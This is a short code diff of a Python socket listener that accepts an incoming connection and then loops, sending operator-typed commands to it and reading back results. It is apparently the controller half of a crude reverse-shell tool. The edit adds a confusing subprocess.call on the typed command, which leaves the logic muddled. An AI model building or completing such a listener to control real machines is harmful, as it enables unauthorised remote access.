@@ -31,6 +31,7 @@
 
 
 import socket
+import subprocess
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -41,8 +42,12 @@ connection, address = listener.accept()
 print("[+] Connection established with " + str(address))
 
 while True:
+    #command = subprocess.call(input(">> "))
+    #command = str(command)
+    #command = subprocess.call(command)
     command = input(">> ")
-    command = command.split("\n")
+    
+    command = subprocess.call(command)
     command = str(command)
     connection.send(command.encode('ASCII'))
     result = connection.recv(1024)
